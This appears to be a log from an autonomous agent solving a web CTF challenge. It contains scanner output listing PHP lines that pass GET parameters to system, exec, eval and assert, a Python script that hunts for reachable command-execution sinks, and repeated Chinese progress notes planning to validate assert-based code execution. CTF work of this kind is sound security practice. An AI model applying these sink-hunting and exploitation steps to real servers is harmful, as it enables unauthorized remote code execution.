+/tmp/ctf-src.9vgiAJ/src/bHni9uDj0ft.php	378	NO_SIMPLE_FALSE_GUARD	print_r($match);	system($_GET['k3wQHu3Wi'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/r_trUJyuieN.php	887	NO_SIMPLE_FALSE_GUARD	$_GET['IKNvHIdiC'] = ' ';	assert($_GET['IKNvHIdiC'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/r_trUJyuieN.php	1590	NO_SIMPLE_FALSE_GUARD	var_dump($MiAYCS);	assert($_GET['dbF43MXcN'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/r_trUJyuieN.php	1649	NO_SIMPLE_FALSE_GUARD	$_GET['IZExu0W8x'] = ' ';	assert($_GET['IZExu0W8x'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/r_trUJyuieN.php	2069	NO_SIMPLE_FALSE_GUARD	$UZLpiLOWHX = $_POST['PoAiLe5WubfceNC'] ?? ' ';	system($_GET['q4yjKed6y'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/LLumqDoemaR.php	230	NO_SIMPLE_FALSE_GUARD	print_r($match);	eval($_GET['cime5OVza'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/LLumqDoemaR.php	312	NO_SIMPLE_FALSE_GUARD	var_dump($QrDx6f24Ukc);	system($_GET['hkUp8dXDV'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/LLumqDoemaR.php	993	NO_SIMPLE_FALSE_GUARD	$_GET['ni3t0Am4u'] = ' ';	system($_GET['ni3t0Am4u'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/LLumqDoemaR.php	1708	NO_SIMPLE_FALSE_GUARD	$WEnswh1 = $_GET['EJBUkPO7CcT'] ?? ' ';	exec($_GET['BcwntD2Nt'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	48	NO_SIMPLE_FALSE_GUARD	var_dump($lC);	eval($_GET['yaIZtC7Jp'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	70	NO_SIMPLE_FALSE_GUARD	$_GET['D34X78BBw'] = ' ';	assert($_GET['D34X78BBw'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	222	NO_SIMPLE_FALSE_GUARD	$X2E4WLScl = explode('Hk_2OptZ1', $X2E4WLScl);	system($_GET['EEEP_92H7'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	1198	NO_SIMPLE_FALSE_GUARD	$_GET['JYBRAJrOx'] = ' ';	exec($_GET['JYBRAJrOx'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	1200	NO_SIMPLE_FALSE_GUARD	$_GET['Cl6C94Wl1'] = ' ';	assert($_GET['Cl6C94Wl1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	1511	NO_SIMPLE_FALSE_GUARD	$_GET['quDLmlvbL'] = ' ';	system($_GET['quDLmlvbL'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ZHA5s99zOzw.php	1680	NO_SIMPLE_FALSE_GUARD	$_GET['UetoXMqMm'] = ' ';	exec($_GET['UetoXMqMm'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/O6sAkkOope1.php	44	NO_SIMPLE_FALSE_GUARD	$fw2ib_ .= 'IMdnGG6LUYaM';	assert($_GET['kVdpqeaj5'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/FlGGRTahzEe.php	411	NO_SIMPLE_FALSE_GUARD	$_GET['t2xt5Cg0d'] = ' ';	system($_GET['t2xt5Cg0d'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/FlGGRTahzEe.php	417	NO_SIMPLE_FALSE_GUARD	$_GET['TnObx92ry'] = ' ';	assert($_GET['TnObx92ry'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/FlGGRTahzEe.php	831	NO_SIMPLE_FALSE_GUARD	$u5f = explode('Tokfzb', $u5f);	assert($_GET['ISZ_hnESb'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/PQZbzJdEf9N.php	134	NO_SIMPLE_FALSE_GUARD	$_GET['vzazvOXN7'] = ' ';	assert($_GET['vzazvOXN7'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/PQZbzJdEf9N.php	228	NO_SIMPLE_FALSE_GUARD	$IsZKA = explode('T0DOOk', $IsZKA);	exec($_GET['uYlp9EOwf'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/PQZbzJdEf9N.php	801	NO_SIMPLE_FALSE_GUARD	var_dump($_YQPnay);	eval($_GET['hYmOsRmab'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/PQZbzJdEf9N.php	826	NO_SIMPLE_FALSE_GUARD	var_dump($Y4oUfHbJeh);	assert($_GET['ljclnBQvN'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/cU0gWJ1zOIA.php	434	NO_SIMPLE_FALSE_GUARD	var_dump($yY);	assert($_GET['fLrXyebcH'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/MFW6a_OgPny.php	121	NO_SIMPLE_FALSE_GUARD	$_GET['NL9brXy9B'] = ' ';	system($_GET['NL9brXy9B'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/MFW6a_OgPny.php	630	NO_SIMPLE_FALSE_GUARD	$e5CarFnjt .= 'ZNowrZ6K4';	eval($_GET['TxOGc9byw'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/YZsG5SBufJl.php	866	NO_SIMPLE_FALSE_GUARD	$_GET['KqMUJKuYp'] = ' ';	system($_GET['KqMUJKuYp'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/M1rpmaW7Sg_.php	111	NO_SIMPLE_FALSE_GUARD	$_GET['U2rGnUK9y'] = ' ';	eval($_GET['U2rGnUK9y'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/M1rpmaW7Sg_.php	483	NO_SIMPLE_FALSE_GUARD	var_dump($bHCUL);	system($_GET['L5IZ5z5FT'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/CMNhKRcYX2T.php	491	NO_SIMPLE_FALSE_GUARD	$_GET['Gt9A9oka1'] = ' ';	eval($_GET['Gt9A9oka1'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/CMNhKRcYX2T.php	677	NO_SIMPLE_FALSE_GUARD	$_GET['cI2MEMKHr'] = ' ';	exec($_GET['cI2MEMKHr'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/jvhtiaSLgxt.php	331	NO_SIMPLE_FALSE_GUARD	var_dump($uZZitPsOn);	assert($_GET['_MEoN17gz'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ilJVRCsKJes.php	244	NO_SIMPLE_FALSE_GUARD	str_replace('MGDVtNy7', 'siY_zqkst', $At);	eval($_GET['vsQgNf3_f'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ilJVRCsKJes.php	271	NO_SIMPLE_FALSE_GUARD	var_dump($QikRfNNqEEd);	assert($_GET['OIC6xMMtm'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ilJVRCsKJes.php	731	NO_SIMPLE_FALSE_GUARD	$_GET['VCISqTB6x'] = ' ';	exec($_GET['VCISqTB6x'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ilJVRCsKJes.php	803	NO_SIMPLE_FALSE_GUARD	var_dump($hN);	system($_GET['uNyZ8F45Q'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/u9qoa9FBr8T.php	179	NO_SIMPLE_FALSE_GUARD	var_dump($aCREBmQZZkQ);	eval($_GET['RDFJ8k_F0'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/u9qoa9FBr8T.php	198	NO_SIMPLE_FALSE_GUARD	var_dump($ApQ);	exec($_GET['aT1nSltXn'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/HLUUrGFk9qn.php	646	NO_SIMPLE_FALSE_GUARD	$_GET['KJ_sk8q41'] = ' ';	exec($_GET['KJ_sk8q41'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/HLUUrGFk9qn.php	1644	NO_SIMPLE_FALSE_GUARD	var_dump($sMX3DgTRX);	eval($_GET['MocWNouRH'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/C3zSAZXUYjV.php	448	NO_SIMPLE_FALSE_GUARD	$qeJ = $_POST['x__CqWijIzTD'] ?? ' ';	assert($_GET['TWEL4P_bY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/C3zSAZXUYjV.php	812	NO_SIMPLE_FALSE_GUARD	}	eval($_GET['YpobNPFOE'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/C3zSAZXUYjV.php	873	NO_SIMPLE_FALSE_GUARD	$_GET['TOk8Ja9Cw'] = ' ';	exec($_GET['TOk8Ja9Cw'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/C3zSAZXUYjV.php	1674	NO_SIMPLE_FALSE_GUARD	}	system($_GET['Mj2H87llR'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/C3zSAZXUYjV.php	1785	NO_SIMPLE_FALSE_GUARD	$FZSEdoqryfY = $_GET['oCDUSpyAujg'] ?? ' ';	eval($_GET['OttAA2Ll3'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/C3zSAZXUYjV.php	1808	NO_SIMPLE_FALSE_GUARD	$_GET['e7KMdvfTT'] = ' ';	system($_GET['e7KMdvfTT'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ulIjTf1jV9t.php	315	NO_SIMPLE_FALSE_GUARD	print_r($match);	exec($_GET['GEMgay9Tq'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ulIjTf1jV9t.php	419	NO_SIMPLE_FALSE_GUARD	$nPR = $_POST['wF0xsSB'] ?? ' ';	assert($_GET['O2b9uYme5'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ulIjTf1jV9t.php	689	NO_SIMPLE_FALSE_GUARD	echo $zqzOB;	eval($_GET['oiEqSCMQY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ulIjTf1jV9t.php	1358	NO_SIMPLE_FALSE_GUARD	$WjtFjvDSUS9 = $_POST['Mi2r7N9E7w'] ?? ' ';	assert($_GET['rrNqGMn1e'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/ulIjTf1jV9t.php	1806	NO_SIMPLE_FALSE_GUARD	$_GET['O8PYKU0qa'] = ' ';	system($_GET['O8PYKU0qa'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/VGixoqukMM4.php	173	NO_SIMPLE_FALSE_GUARD	$tS21pD6O .= 'dQj72OB';	system($_GET['Tdu7VAbNO'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/VGixoqukMM4.php	757	NO_SIMPLE_FALSE_GUARD	$uWMZpfjgMaI .= 'fVzXxuJkW3';	assert($_GET['bQMSzFur4'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	150	NO_SIMPLE_FALSE_GUARD	$_GET['TjroiX5Tz'] = ' ';	eval($_GET['TjroiX5Tz'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	469	NO_SIMPLE_FALSE_GUARD	var_dump($bZnbd4);	eval($_GET['QZEZLRbUt'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	625	NO_SIMPLE_FALSE_GUARD	$_GET['Ccd0lpZFE'] = ' ';	eval($_GET['Ccd0lpZFE'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	1132	NO_SIMPLE_FALSE_GUARD	var_dump($A1hG);	system($_GET['TNTIuKdlu'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	1214	NO_SIMPLE_FALSE_GUARD	echo $Yn;	exec($_GET['gHuvW2DnS'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	1275	NO_SIMPLE_FALSE_GUARD	$_GET['qBasJ_Hv9'] = ' ';	assert($_GET['qBasJ_Hv9'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	1521	NO_SIMPLE_FALSE_GUARD	}	assert($_GET['kz4ZVaSlO'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	1700	NO_SIMPLE_FALSE_GUARD	$hWQh_W .= 'LSAJg4N';	system($_GET['q5AmXiHbs'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/exc3fvu7CDI.php	1845	NO_SIMPLE_FALSE_GUARD	$_GET['h6oayNlRK'] = ' ';	exec($_GET['h6oayNlRK'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Tu8Y3Yy9pKu.php	26	NO_SIMPLE_FALSE_GUARD	/*	exec($_GET['gWPbay_88'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Tu8Y3Yy9pKu.php	397	NO_SIMPLE_FALSE_GUARD	$_GET['VUpHHmove'] = ' ';	assert($_GET['VUpHHmove'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/t1M4dw9ipeR.php	164	NO_SIMPLE_FALSE_GUARD	}	assert($_GET['lNJJE1BK8'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/pynMak4pXAy.php	177	NO_SIMPLE_FALSE_GUARD	$LMk0Tu0gqld = $_POST['AepDl8K8wqWRN'] ?? ' ';	eval($_GET['Qh8QQT8el'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/pynMak4pXAy.php	549	NO_SIMPLE_FALSE_GUARD	$_GET['IBWGevfnF'] = ' ';	eval($_GET['IBWGevfnF'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/pynMak4pXAy.php	731	NO_SIMPLE_FALSE_GUARD	$_GET['xRmCl9Kpl'] = ' ';	assert($_GET['xRmCl9Kpl'] ?? ' ');
+
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..48bcf2689211b7c8da7e29e0e16489935f971cfe
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 并发请求源码中的全部 PHP 文件，按响应长度/内容离群检测真实入口
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,17 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..48bcf2689211b7c8da7e29e0e16489935f971cfe
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 并发请求源码中的全部 PHP 文件，按响应长度/内容离群检测真实入口
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,17 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "python3 - <<'PY'
+from pathlib import Path
+import re
+root=Path('/tmp/ctf-src.9vgiAJ/src')
+sink=re.compile(r'\\b(eval|system|exec|shell_exec|passthru|popen|proc_open)\\s*\\(\\s*\\"'$_(GET|POST|REQUEST|COOKIE)'"\\s*\\[\\s*[\\'\\\"](["'^'"\\'\\\"]+)[\\'\\\"]\\s*\\]',re.I)
+assign_tpl=r'\\"'$_{src}'"\\s*\\[\\s*([\\'\\\"]){param}\\1\\s*\\]\\s*='
+ifeq=re.compile(r\""'^'"\\s*if\\s*\\(\\s*(['\\\"])(.*?)\\1\\s*(===|==|"'!==|!=)'"\\s*(['\\\"])(.*?)\\4\\s*\\)\\s*\\{?\\s*"'$")
+out=[]
+for p in root.glob('"'*.php'):
+    lines=p.read_text(errors='replace').splitlines()
+    block=False
+    for i,line in enumerate(lines):
+        s=line.strip(); incomment=block or s.startswith(('//','#','*'))
+        if not block and '/*' in line and line.index('/*') <= max(line.find('eval'),line.find('system'),line.find('exec')) if max(line.find('eval'),line.find('system'),line.find('exec'))>=0 else False: incomment=True
+        if '/*' in line and '*/' not in line: block=True
+        if block and '*/' in line: block=False
+        m=sink.search(line)
+        if not m or incomment: continue
+        func,src,param=m.group(1).lower(),m.group(2),m.group(3)
+        prev=''
+        for j in range(i-1,-1,-1):
+            if lines[j].strip(): prev=lines[j].strip(); break
+        fm=ifeq.match(prev)
+        if fm:
+            a,op,b=fm.group(2),fm.group(3),fm.group(5)
+            truth=(a==b) if op in ('==','===') else (a"'!=b)
+            if not truth: continue
+        assigned=[]
+        ar=re.compile(assign_tpl.format(src=src,param=re.escape(param)))
+        for j in range(i):
+            if ar.search(lines[j]): assigned.append((j+1,lines[j].strip()))
+        if not assigned:
+            out.append((i+1,p.name,func,src,param,prev))
+out.sort()
+print('"'unassigned_direct_candidates',len(out))
+for x in out[:160]: print('\\t'.join(map(str,x)))
+PY" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..48bcf2689211b7c8da7e29e0e16489935f971cfe
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 并发请求源码中的全部 PHP 文件，按响应长度/内容离群检测真实入口
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,17 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
+ 
+ ## Flags Found
+ (无)
+
+ succeeded in 4801ms:
+unassigned_direct_candidates 0
+
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..371e0d07c8e3699b8d9a465e9040fd094e65cf89
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++vulnerability validation
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 验证 `ASrs5FZnWZi.php?BfgA7IHwU=...` 的字符串 assert 代码执行
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 若 assert 不可用，检查该文件所有无恒假条件保护的危险调用
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,22 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..371e0d07c8e3699b8d9a465e9040fd094e65cf89
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++vulnerability validation
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 验证 `ASrs5FZnWZi.php?BfgA7IHwU=...` 的字符串 assert 代码执行
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 若 assert 不可用，检查该文件所有无恒假条件保护的危险调用
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,22 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
